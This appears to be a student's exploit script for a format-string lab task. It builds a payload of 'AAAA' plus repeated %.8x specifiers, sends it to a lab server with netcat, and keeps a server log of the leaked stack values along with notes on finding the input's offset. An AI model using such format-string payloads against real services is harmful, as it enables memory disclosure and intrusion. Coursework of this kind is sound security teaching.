#! /usr/bin/python3
import sys

def stack_data(N):
    global content

    s = "AAAA " + "%.8x "*N + "\n"
    fmt = (s).encode('latin-1')
    content[0:len(fmt)] = fmt
    
    # %x get 4 Bytes -> 1 Byte = 2 Hex; so 4 Bytes = 8 Hex -> %.8x


N = 1500
content = bytearray(0x0 for i in range(N))

stack_data(int(sys.argv[1]))

with open('badfile', 'wb') as f:
    f.write(content)
    
    
"""
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd250
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd178
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | AAAA 11223344 00001000 08049da5 080e5320 080e61c0 ffffd250 ffffd178 080e62d4 080e5000 ffffd218 08049f6e ffffd250 00000000 00000064 08049f37 080e5320 000005dc 000005dc ffffd250 ffffd250 080e9720 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 65f4b700 080e5000 080e5000 ffffd838 08049eef ffffd250 000005dc 000005dc 080e5320 00000000 00000000 00000000 ffffd904 00000000 00000000 00000000 000005dc 41414141 
"""

# to execute 
# python3 task2A.py 64; cat badfile | nc 10.9.0.5 9090

# the difference between Frame Pointer (0xffffd178) and the input buffer's address (0xffffd250) is 0xd8 -> 216 bytes -> 54 cells
# so we need at least 54 cells to reach the Frame Pointer

# with 64 cells we can see that the last one in 41414141 that is AAAA in hex

"""
Why 64 Instead of 54:
    The argument 64 accounts for:
        The 54 cells from the difference between the frame pointer and the input buffer.
        The additional stack frames, saved registers, and alignment padding added by the system.
"""
